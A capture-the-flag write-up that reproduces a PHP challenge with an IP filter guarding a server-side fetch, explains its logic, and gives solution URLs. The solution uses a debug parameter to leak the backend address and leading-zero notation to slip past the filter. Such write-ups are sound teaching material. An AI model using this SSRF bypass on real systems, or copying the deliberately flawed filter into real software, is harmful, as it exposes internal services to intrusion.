```
<?php
        error_reporting(0);
        function fetch_backend($ip) {
            if(is_bad_ip($ip)) {
                return "This IP is not allowed!";
            }
            return file_get_contents("http://". $ip . "/");
        }
        function is_bad_ip($ip) {
            if(!preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/', $ip)) {
                // IP must be in X.Y.Z.Q format
                return true;
            }
            $frontend = gethostbyname(gethostname());
            $backend = gethostbyname("ipfilter_backend");
            $subnet = long2ip(ip2long($frontend) & ip2long("255.255.255.0"));
            $bcast = long2ip(ip2long($frontend) | ~ip2long("255.255.255.0"));

            if(isset($_GET['debug_filter'])) {
                echo "<pre>";
                echo "IP: " . $ip . "<br>";
                echo "Frontend: " . $frontend . "<br>";
                echo "Backend: " . $backend . "<br>";
                echo "Subnet:" . $subnet . "<br>";
                echo "Broadcast:" . $bcast . "<br>";
                echo  "</pre>";
            }

            if(inet_pton($ip) < (int) inet_pton($subnet)) {
                // Do not go below the subnet!
                return true;
            }
            if(! (inet_pton($ip) < inet_pton($bcast))) {
                // Do not go above the subnet!
                return true;
            }
            if($ip == $backend) {
                // Do not allow the backend with our secrets ;-)
                return true;
            }
            return false;
        }
        if(isset($_GET['fetch_backend']) ) {
            echo fetch_backend($_GET['bip']);
        }
        if(isset($_GET['src'])) {
            highlight_file(__FILE__);
        }
        // with <3 from @gehaxelt
    ?>
```
fetch_backend Function: This function takes an IP address as its parameter and attempts to fetch content from that IP address by constructing a URL using file_get_contents(). However, before fetching, it checks if the provided IP is considered "bad" using the is_bad_ip function. If the IP is bad, it returns an error message; otherwise, it fetches and returns the content from the provided IP.

is_bad_ip Function: This function takes an IP address as its parameter and performs several checks to determine if the IP is "bad" and should be disallowed:

The function first checks if the IP is not in the correct format (X.Y.Z.Q format).
It then gets the IP address of the frontend server and the IP address of a server named "ipfilter_backend."
The function calculates the subnet and broadcast addresses based on the frontend server's IP.
If the debug_filter query parameter is set, it displays various IP-related information for debugging purposes.
It checks if the provided IP falls below the subnet or goes above the broadcast address; if so, the IP is considered bad.
It also checks if the provided IP matches the IP of the backend server, and if so, it's considered bad.


+ http://52.59.124.14:10019/?fetch_backend=&debug_filter=&bip=127.0.0.1
![image](https://github.com/Avanthikaanand/My-Writeups/assets/80388135/c983c854-6e3e-4c49-b7a9-2a251a6f5ad6)
Here as we can see in Figure 1, we get the backend IP as 192.168.112.3. However if we directly try this IP in the bip field, the script IP-filtering won’t allow us.
http://52.59.124.14:10019/?fetch_backend=&debug_filter=&bip=192.168.112.003
we get the flag!

